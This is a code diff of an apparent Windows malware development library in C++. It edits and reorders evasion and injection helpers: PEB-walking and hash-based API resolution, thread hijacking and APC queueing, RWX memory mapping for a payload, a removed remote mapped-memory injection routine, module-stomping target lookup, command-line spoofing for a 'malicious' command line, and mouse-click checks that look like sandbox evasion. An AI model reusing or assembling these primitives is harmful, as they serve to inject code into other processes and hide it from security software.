@@ -198,11 +198,11 @@ BOOLEAN FetchDrives
 	IN OUT LPWSTR pPath
 )
 {
-	DWORD dwDrivesBitMask		= 0x00000000;
+	DWORD dwDrivesBitMask		= NULL;
 	USHORT drives_index			= 0x00,
 		   loop_index			= 0x00;
 
-	if ((dwDrivesBitMask		= GetLogicalDrives()) == 0x00000000) return FALSE;
+	if ((dwDrivesBitMask		= GetLogicalDrives()) == NULL) return FALSE;
 
 	for (loop_index = 0x00; loop_index <= 0x1c; loop_index++)
 	{
@@ -227,7 +227,7 @@ LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
 	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t	 = nullptr;
 	USHORT					 usFileLoopIndex = 0x0000;
 	SIZE_T					 sArraySize		 = 0x00000003,
-							 sFileName		 = 0x00000000;
+							 sFileName		 = NULL;
 	LPWSTR					 pFileName		 = nullptr;
 
 
@@ -360,18 +360,99 @@ cleanup:
 	return bState;
 }
 
-static PPEB FetchProcessEnvironmentBlock
-( 
-	IN     VOID 
+static PHANDLE FetchMouseHandle
+(
+	OUT PWORD pwFoundMiceAmount
 )
 {
+	UINT				uiArrayLength		 = NULL,
+						uiCurrentIndex		 = NULL,
+						uiDataSize			 = sizeof(RAWINPUTDEVICE);
+	PUINT				pMiceOrdinals		 = nullptr;
+	PHANDLE				pMiceHandles		 = nullptr;
+	PRAWINPUTDEVICELIST pRawInputDevices_arr = nullptr;
+	PRID_DEVICE_INFO   *pOutData			 = nullptr; 
+	RAWINPUT			mosue_t				 = {};
 
+	GetRawInputBuffer(reinterpret_cast<PRAWINPUT>(&mosue_t), &uiDataSize,sizeof(RAWINPUT));
+
+	if (GetRawInputDeviceList(nullptr, &uiArrayLength, sizeof(RAWINPUTDEVICE)) != 0x00)
+	{
+		printf("[!] Failed to Retrieve Input Devices Array Size!\n[i] ErrorCode: %lx", GetLastError());
+
+		return nullptr;
+	}
+	pRawInputDevices_arr = static_cast<PRAWINPUTDEVICELIST>(LocalAlloc(LPTR, uiArrayLength * sizeof(RAWINPUTDEVICE)));
+
+	pMiceHandles = static_cast<PHANDLE>(LocalAlloc(LPTR, uiArrayLength * sizeof(HANDLE)));
+
+	pMiceOrdinals = static_cast<PUINT>(LocalAlloc(LPTR, uiArrayLength * sizeof(WORD)));
+
+	if (pRawInputDevices_arr == nullptr || pMiceHandles == nullptr || pMiceOrdinals == nullptr) return nullptr;
+
+	if (uiArrayLength == 0xFFFFFFFF)
+	{
+		printf("[!] Failed to Retrieve Input Devices!\n[i] ErrorCode: %lx", GetLastError());
+
+		return nullptr;
+	}
+
+	if (pRawInputDevices_arr == nullptr) return nullptr;
+
+	PRAWINPUTDEVICELIST RawInputDevice_arr = nullptr;
+
+	GetRawInputDeviceList(pRawInputDevices_arr, &uiArrayLength, sizeof(RAWINPUTDEVICE));
+
+	while (uiCurrentIndex < uiArrayLength)
+	{
+		if (pRawInputDevices_arr[uiCurrentIndex].dwType == 0)
+		{
+			printf("[i] Found a Mouse!\n");
+
+			pMiceHandles[*pwFoundMiceAmount] = pRawInputDevices_arr[uiCurrentIndex].hDevice;
+
+			pMiceOrdinals[*pwFoundMiceAmount] = uiCurrentIndex;
+
+			*pwFoundMiceAmount += 1;
+		}
+		uiCurrentIndex++;
+	}
+	pOutData = static_cast<PRID_DEVICE_INFO*>(LocalAlloc(LPTR, *pwFoundMiceAmount * sizeof(PRID_DEVICE_INFO)));
+
+	for (WORD i = 0; i < *pwFoundMiceAmount; i++)
+	{
+		uiDataSize			= sizeof(RID_DEVICE_INFO);
+
+		pOutData[i]			= static_cast<PRID_DEVICE_INFO>(LocalAlloc(LPTR, sizeof(RID_DEVICE_INFO)));
+
+		pOutData[i]->cbSize = sizeof(RID_DEVICE_INFO);
+
+		GetRawInputDeviceInfoA(pRawInputDevices_arr[pMiceOrdinals[i]].hDevice, RIDI_DEVICEINFO, pOutData[i], &uiDataSize);
+	}
+
+	for (WORD i = 0; i < *pwFoundMiceAmount; i++) 
+	{
+		printf("%lu\n", pOutData[i]->mouse.dwId);
+
+		
+	}
+	return pMiceHandles;
+}
+
+namespace Anonymous
+{
+	static PPEB FetchProcessEnvironmentBlock
+	(
+		IN     VOID
+	)
+	{
 #ifdef _WIN64
-	PPEB pPeb = reinterpret_cast<PPEB>(__readgsqword(0x60));
+		PPEB pPeb = (PEB*)__readgsqword(0x60);
 #elif  _WIN32
-	PPEB pPeb = (PEB*)(__readfsdword(0x30));
+		PPEB pPeb = (PEB*)(__readfsdword(0x30));
 #endif
-	return pPeb;
+		return pPeb;
+	}
 }
 
 BOOLEAN FetchProcessHandleEnumProcesses
@@ -386,8 +467,8 @@ BOOLEAN FetchProcessHandleEnumProcesses
 	BOOLEAN  bState						   = FALSE;
 	DWORD    dwReturnLen1				   = 0,
 			 dwReturnLen2				   = 0,
-			 dwProcesses_arr[2048]		   = { 0x00000000 };
-	WCHAR    wcEnumeratedProcess[MAX_PATH] = { 0x00000000 };
+			 dwProcesses_arr[2048]		   = { NULL };
+	WCHAR    wcEnumeratedProcess[MAX_PATH] = { NULL };
 	HMODULE	 EnumeratedModule			   = nullptr;
 	HANDLE	 hProcess					   = INVALID_HANDLE_VALUE;
 
@@ -473,9 +554,9 @@ BOOLEAN FetchProcessHandleNtQuerySystemInformation
 	PSYSTEM_PROCESS_INFORMATION  pSystemProcessInformation_t = nullptr;
 	BOOLEAN                      bState						 = FALSE;
 	fnNtQuerySystemInformation   pfNtQuerySystemInformation	 = nullptr;
-	HMODULE						 hModule					 = GetModuleHandleReplacementH(*pdwPid);
+	
 
-	if ((pfNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcessAddressReplacement(hModule, const_cast<LPSTR>("NtQuerySystemInformation"))) == nullptr) return FALSE;
+	if ((pfNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcessAddressReplacement(GetModuleHandleReplacement(const_cast<LPWSTR>(L"ntdll.dll")), const_cast<LPSTR>("NtQuerySystemInformation"))) == nullptr) return FALSE;
 
 	pfNtQuerySystemInformation(SystemProcessInformation, nullptr, 0, &ulReturnedLengthValue1);
 
@@ -576,23 +657,48 @@ BOOLEAN FetchResource
 	return TRUE;
 }
 
-HMODULE GetModuleHandleReplacement
+BOOL FetchStompingTarget
 (
-	IN     LPWSTR lpwTargetModuleName
+	IN     LPSTR   pSacrificialDllName,
+	IN     LPSTR   pSacrificialFuncName,
+	   OUT PVOID  *pTargetFunctionAddress
 )
 {
-	PPEB				  pProcessEnvironmentBlock = FetchProcessEnvironmentBlock();
+	if (!pSacrificialDllName || !pSacrificialFuncName || !pTargetFunctionAddress) return FALSE;
+
+	HMODULE hSacrificialModule = nullptr;
+
+	if ((hSacrificialModule = LoadLibraryA(pSacrificialDllName)) == nullptr)
+	{
+		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
+		return FALSE;
+	}
+	
+	if ((*pTargetFunctionAddress = (PVOID)GetProcAddress(hSacrificialModule, pSacrificialFuncName)) == nullptr) 
+	{
+		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
+		return FALSE;
+	}
+	return TRUE;
+}
+
+HMODULE GetModuleHandleReplacement
+(
+	IN     LPCWSTR lpwTargetModuleName
+)
+{
+	PPEB				  pProcessEnvironmentBlock = Anonymous::FetchProcessEnvironmentBlock();
 	PLDR_DATA_TABLE_ENTRY pLDRDataTableEntry	   = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink);
 	PLIST_ENTRY			  pListHead				   = &pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList,
 						  pCurrentListNode		   = pListHead->Flink;
-
 	do
 	{
 		if (pLDRDataTableEntry->FullDllName.Length != 0) 
 		{
-			if (_wcsicmp(pLDRDataTableEntry->FullDllName.Buffer, lpwTargetModuleName) == 0)  return static_cast<HMODULE>(pLDRDataTableEntry->Reserved2[0]);
-			
-
+			if (_wcsicmp(pLDRDataTableEntry->FullDllName.Buffer, lpwTargetModuleName) == 0)
+			{
+				return static_cast<HMODULE>(pLDRDataTableEntry->Reserved2[0]);
+			}
 			pLDRDataTableEntry = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pCurrentListNode->Flink);
 
 			pCurrentListNode   = pCurrentListNode->Flink;
@@ -608,15 +714,15 @@ HMODULE GetModuleHandleReplacementH
 	IN    DWORD dwTargetModuleName
 )
 {
-	PPEB				  pProcessEnvironmentBlock_t = FetchProcessEnvironmentBlock();
+	PPEB				  pProcessEnvironmentBlock_t = Anonymous::FetchProcessEnvironmentBlock();
 	PPEB_LDR_DATA		  pLoaderDataTable_t		 = pProcessEnvironmentBlock_t->Ldr;
 	PLDR_DATA_TABLE_ENTRY pDataEntryDataTable_t		 = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pLoaderDataTable_t->InMemoryOrderModuleList.Flink);
 	PLIST_ENTRY			  pListHead					 = &pProcessEnvironmentBlock_t->Ldr->InMemoryOrderModuleList,
 						  pCurrentListNode			 = pListHead->Flink;
-	DWORD				  dwCandidate				 = 0x00000000;
+	DWORD				  dwCandidate				 = NULL;
 	do
 	{
-		if (pDataEntryDataTable_t->FullDllName.Length != 0)
+		if (pDataEntryDataTable_t->FullDllName.Length != NULL)
 		{
 			dwCandidate = HASHW(pDataEntryDataTable_t->FullDllName.Buffer);
 
@@ -628,7 +734,8 @@ HMODULE GetModuleHandleReplacementH
 
 			pCurrentListNode = pCurrentListNode->Flink;
 		}
-	} while (pListHead != pCurrentListNode);
+	}
+	while (pListHead != pCurrentListNode);
 
 	return nullptr;
 }
@@ -658,9 +765,9 @@ FARPROC GetProcessAddressReplacement
 	{
 		if (strcmp(lpTargetApiName, reinterpret_cast<PCHAR>(pModuleBaseAddress + pdwFunctionsNamesRVA_arr[i])) != 0) continue;
 
-		WORD wFunctionsOrdinal = pwFunctionsRVAOrdinals_arr[i];
+		WORD wFunctionsOrdinal	= pwFunctionsRVAOrdinals_arr[i];
 
-		fnTargetFunction = reinterpret_cast<FARPROC>(pModuleBaseAddress + pdwFunctionsRVA_arr[wFunctionsOrdinal]);
+		fnTargetFunction		= reinterpret_cast<FARPROC>(pModuleBaseAddress + pdwFunctionsRVA_arr[wFunctionsOrdinal]);
 
 		break;
 	}
@@ -684,7 +791,7 @@ FARPROC GetProcessAddressReplacementH
 	PDWORD				pdwFunctionsNamesRVA_arr	= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfNames),
 						pdwFunctionsRVA_arr			= reinterpret_cast<PDWORD>(pImageBase + pImageExportDirectory_t->AddressOfFunctions);
 	PWORD				pwFunctionsOrdinalsRVA_arr  = reinterpret_cast<PWORD >(pImageBase + pImageExportDirectory_t->AddressOfNameOrdinals);
-	DWORD				dwCandidateHash				= 0x00000000;
+	DWORD				dwCandidateHash				= NULL;
 	LPSTR				lpFunctionName				= nullptr;
 
 	for (DWORD i = 0; i < pImageExportDirectory_t->NumberOfFunctions; i++)
@@ -696,6 +803,7 @@ FARPROC GetProcessAddressReplacementH
 	}
 	return nullptr;
 }
+
 BOOLEAN HijackThread
 (
 	IN     HANDLE hThread,
@@ -762,16 +870,179 @@ BOOLEAN HijackLocalThread
 	return TRUE;
 }
 
-VOID TestAlertableThread
+BOOLEAN LogConsoleMouseClicks
 (
-	HANDLE hAlertableThreadHandle
+	IN	   VOID
 )
 {
-	for (unsigned short i = 0; i < 1000; i++)
+	HANDLE			   hConsoleHandle	  = INVALID_HANDLE_VALUE;
+	DWORD			   dwPrevInputMode	  = NULL,
+					   dwNewInputMode	  = ENABLE_EXTENDED_FLAGS | ENABLE_MOUSE_INPUT,
+					   dwClicksToCatch	  = NULL,
+					   dwNumEventsRead	  = NULL;
+	INPUT_RECORD	   input_record_t	  = { };
+	MOUSE_EVENT_RECORD MouseEventRecord_t = { };
+
+	printf("[i] Looking For Mouse Clicks...\n");
+
+	hConsoleHandle = GetStdHandle(STD_INPUT_HANDLE);
+
+	if (!GetConsoleMode(hConsoleHandle, &dwPrevInputMode))	return FALSE;
+
+	if (!SetConsoleMode(hConsoleHandle, dwNewInputMode))	return FALSE;
+
+	while (dwClicksToCatch < 10)
 	{
-		if (!QueueUserAPC((PAPCFUNC)AlertableFunction1, hAlertableThreadHandle, i)) break;
-		SleepEx(120, TRUE);
+		if (!ReadConsoleInputA(hConsoleHandle, &input_record_t, 1, &dwNumEventsRead)) return FALSE;
+
+		if (input_record_t.EventType != MOUSE_EVENT) continue;
+
+		 MouseEventRecord_t = reinterpret_cast<MOUSE_EVENT_RECORD&>(input_record_t.Event.MouseEvent);
+
+		if (MouseEventRecord_t.dwButtonState & RI_MOUSE_LEFT_BUTTON_DOWN)
+		{
+			printf("\t[+] Left  Mouse Click Detected at (%u, %u)!\n", MouseEventRecord_t.dwMousePosition.X, MouseEventRecord_t.dwMousePosition.Y);
+
+			dwClicksToCatch++;
+		}
+
+		if (MouseEventRecord_t.dwButtonState & RIGHTMOST_BUTTON_PRESSED)
+		{
+			printf("\t[+] Right Mouse Click Detected at (%u, %u)!\n", MouseEventRecord_t.dwMousePosition.X, MouseEventRecord_t.dwMousePosition.Y);
+
+			dwClicksToCatch++;
+		}
 	}
+
+	return TRUE;
+}
+
+VOID MiceHandlesTests()
+{
+	/*
+	if ((lresult = DefWindowProcA(GetConsoleWindow(), WM_MBUTTONDBLCLK, wParam, uiDeviceDataSize)) != 0)
+	{
+		printf("[!] Failed to Retrieve Mouse Data!\n[i] ErrorCode: %lx", GetLastError());
+
+		return FALSE;
+	}
+
+	while (true)
+	{
+		if (WindowProc(GetConsoleWindow(), WM_MBUTTONDBLCLK, GET_RAWINPUT_CODE_WPARAM(MK_LBUTTON | MK_CONTROL | MK_MBUTTON | MK_RBUTTON),
+			reinterpret_cast<LPARAM>(&uiDeviceDataSize)) == uiDeviceDataSize) printf("Some Bullshit\n");
+	}
+
+	//pNtQuerySystemInfo = reinterpret_cast<fnNtQuerySystemInformation>(GetProcessAddressReplacement(GetModuleHandleReplacement(L"ntdll.dll"), const_cast<LPSTR>("NtQuerySystemInformation")));
+	if (GET_RAWINPUT_CODE_WPARAM(1, pRawMouse) == 0 ) printf("%p\n",pRawMouse);
+
+	phMiceHandleArray = FetchMouseHandle(&wAmountOfMice);
+
+	if (phMiceHandleArray == nullptr || wAmountOfMice == NULL) return FALSE;
+
+	pRawMouse = static_cast<HRAWINPUT>(LocalAlloc(LPTR, wAmountOfMice * sizeof(HRAWINPUT)));
+
+	if (pMouseData_t_arr == nullptr) return FALSE;
+
+
+
+	for (WORD i = 0; i < wAmountOfMice; i++)
+	{
+
+
+
+		pMouseData_t_arr[i] = static_cast<PRID_DEVICE_INFO>(LocalAlloc(LPTR, uiDeviceDataSize));
+
+		if (pMouseData_t_arr[i] == nullptr) return FALSE;
+
+		if (GetRawInputDeviceInfoA(phMiceHandleArray[i], RIDI_DEVICEINFO, pMouseData_t_arr[i], &uiDeviceDataSize) <= 0)
+		{
+
+			printf("[!] Failed to Retrieve Mouse Data!\n[i] ErrorCode: %lx", GetLastError());
+
+			return FALSE;
+		}
+		if (pMouseData_t_arr[i]->dwType == RIM_TYPEMOUSE)
+		{
+			printf("[!] This is a Mouse!\n");
+
+
+			if (pRawMouse == nullptr)
+			{
+				printf("[i] Device Type: %lu hz\n[i] Number Of Buttons: %lu\n", pMouseData_t_arr[i]->mouse.dwNumberOfButtons, 0);
+
+				printf("[i] Found The Logitech Mouse!\n");
+				break;
+			}
+			//else printf("[x] This Was 0x%.8lx\n", *pRawMouse);
+		}
+	}
+	*/
+}
+
+BOOLEAN MapLocalMemory
+(
+	IN     PUCHAR  pPayload,
+	   OUT PUCHAR *pMappedAddress,
+	IN     SIZE_T  sPayloadSize,
+	   OUT PHANDLE phFileMappingHandle 
+)
+{
+	if (!phFileMappingHandle) return FALSE;
+	
+	BOOLEAN bState			= FALSE;
+	HANDLE  hFile			= INVALID_HANDLE_VALUE;
+	PUCHAR  pMappingAddress = nullptr;
+
+	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, NULL, static_cast<DWORD>(sPayloadSize), nullptr);
+
+	if (hFile == nullptr)
+	{
+		return bState;
+	}
+	pMappingAddress = static_cast<PUCHAR>(MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize));
+
+	if (pMappingAddress == nullptr)
+	{
+		CloseHandle(hFile);
+
+		return bState;
+	}
+	memcpy_s(pMappingAddress, sPayloadSize, pPayload, sPayloadSize);
+
+	bState = TRUE;
+
+	*phFileMappingHandle = hFile;
+
+	*pMappedAddress = pMappingAddress;
+
+	return bState;
+}
+
+
+BOOLEAN ReadStructureFromProcess
+(
+	IN     HANDLE hTargetProcess, 
+	IN     PVOID  pPEBBaseAddress, 
+	   OUT PVOID *pReadBufferAddress, 
+	IN     DWORD  dwBufferSize,
+	IN     HANDLE hHeap
+)
+{
+	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;
+
+	if (*pReadBufferAddress)
+	{
+		*pReadBufferAddress = nullptr;
+	}
+
+	SIZE_T	sBytesRead = 0;
+
+	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
+
+	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;
+
+	return TRUE;
 }
 
 LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
@@ -783,109 +1054,19 @@ LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
 	FreeFileArray(pFiles_arr_t);
 	return FetchFileArrayW(pPath);
 }
- 
-BOOLEAN MapLocalMemory
-(
-	IN     PUCHAR  pPayload,
-	   OUT PUCHAR *pMappedAddress,
-	IN     SIZE_T  sPayloadSize,
-	   OUT PHANDLE phFileMappingHandle 
-)
-{
-	if (!phFileMappingHandle) return FALSE;
-	
-	BOOLEAN bState = FALSE;
-
-	HANDLE hFile = INVALID_HANDLE_VALUE;
-
-	if ((hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, 0x0, static_cast<DWORD>(sPayloadSize), nullptr)) == nullptr) return bState;
-
-	PUCHAR pMappingAddress = static_cast<PUCHAR>(MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize));
-
-	if (pMappingAddress == nullptr) goto cleanup;
-	
-	memcpy_s(pMappingAddress, sPayloadSize, pPayload, sPayloadSize);
-
-	bState = TRUE;
-
-	cleanup:
-
-	if (hFile) CloseHandle(hFile);
-
-	*pMappedAddress = pMappingAddress;
-
-	return bState;
-}
-
-BOOLEAN InjectPayloadRemoteMappedMemory
-(
-	IN     PUCHAR  pPayload,
-	   OUT PUCHAR *pRemoteMappedAddress,
-	   OUT PUCHAR *pLocalMappedAddress,
-	IN	   SIZE_T  sPayloadSize,
-	   OUT PHANDLE phRemoteFileMappingHandle,
-	IN     HANDLE  hProcess
-)
-{
-	if (!pPayload || !pRemoteMappedAddress || !sPayloadSize || !phRemoteFileMappingHandle) return FALSE;
-		
-	
-	PVOID pMapLocalAddress = nullptr, pMapRemoteAddress = nullptr;
-
-	HANDLE hFile = nullptr;
-
-	if (!(hFile = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, nullptr))) return FALSE;
-
-	if (!(pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize))) return FALSE;
-
-	memcpy_s(pMapLocalAddress,sPayloadSize, pPayload, sPayloadSize);
-	
-	if ((pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, 0, nullptr, 0, 0, PAGE_EXECUTE_READWRITE)) == nullptr)  return FALSE;
-
-	*pLocalMappedAddress  = static_cast<PUCHAR>(pMapLocalAddress);
-
-	*pRemoteMappedAddress = static_cast<PUCHAR>(pMapRemoteAddress);
-
-	return TRUE;
-}
-
-BOOL FetchStompingTarget
-(
-	IN     LPSTR   pSacrificialDllName,
-	IN     LPSTR   pSacrificialFuncName,
-	   OUT PVOID* pTargetFunctionAddress
-)
-{
-	if (!pSacrificialDllName || !pSacrificialFuncName || !pTargetFunctionAddress) return FALSE;
-
-	HMODULE hSacrificialModule = nullptr;
-
-	if ((hSacrificialModule = LoadLibraryA(pSacrificialDllName)) == nullptr)
-	{
-		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
-		return FALSE;
-	}
-	
-	if ((*pTargetFunctionAddress = (PVOID)GetProcAddress(hSacrificialModule, pSacrificialFuncName)) == nullptr) 
-	{
-		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
-		return FALSE;
-	}
-	return TRUE;
-}
 
 BOOLEAN SpoofCommandLineArguments
 (
 	IN     LPWSTR  pSpoofedCommandLine,
 	IN	   LPWSTR  pMaliciousCommandLine,
-	IN     DWORD   dwSpoofedcmdLineLength,
+	IN     DWORD   dwSpoofedCLALength,
 	   OUT PHANDLE phProcessHandle,
 	   OUT PDWORD  pdwProcessId,
 	   OUT PHANDLE phThreadHandle,
 	   OUT PDWORD  pdwThreadId
 )
 {
-	if (!pSpoofedCommandLine || !pMaliciousCommandLine || !dwSpoofedcmdLineLength || !phProcessHandle 
+	if (!pSpoofedCommandLine || !pMaliciousCommandLine || !dwSpoofedCLALength || !phProcessHandle 
 	  ||!pdwProcessId		 || !phThreadHandle		   || !pdwThreadId			   ) return FALSE;
 
 	BOOLEAN						  bState				  = FALSE;
@@ -1100,30 +1281,18 @@ EndOfFunc:
 	return bState;
 }
 
-BOOLEAN ReadStructureFromProcess
+VOID TestAlertableThread
 (
-	IN     HANDLE hTargetProcess, 
-	IN     PVOID  pPEBBaseAddress, 
-	   OUT PVOID *pReadBufferAddress, 
-	IN     DWORD  dwBufferSize,
-	IN     HANDLE hHeap
+	IN     HANDLE hAlertableThreadHandle
 )
 {
-	if (!hTargetProcess || !pPEBBaseAddress ||  !dwBufferSize || !pReadBufferAddress) return FALSE;
-
-	if (*pReadBufferAddress)
+	for (unsigned short i = 0; i < 1000; i++)
 	{
-		*pReadBufferAddress = nullptr;
+		if (!QueueUserAPC((PAPCFUNC)AlertableFunction1, hAlertableThreadHandle, i)) break;
+		SleepEx(120, TRUE);
 	}
-
-	SIZE_T	sBytesRead = 0;
-
-	*pReadBufferAddress = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBufferSize);
-
-	if (!ReadProcessMemory(hTargetProcess, pPEBBaseAddress, *pReadBufferAddress, dwBufferSize, &sBytesRead) || sBytesRead != dwBufferSize) return FALSE;
-
-	return TRUE;
 }
+
 
 BOOLEAN WriteToTargetProcessEnvironmentBlock
 (
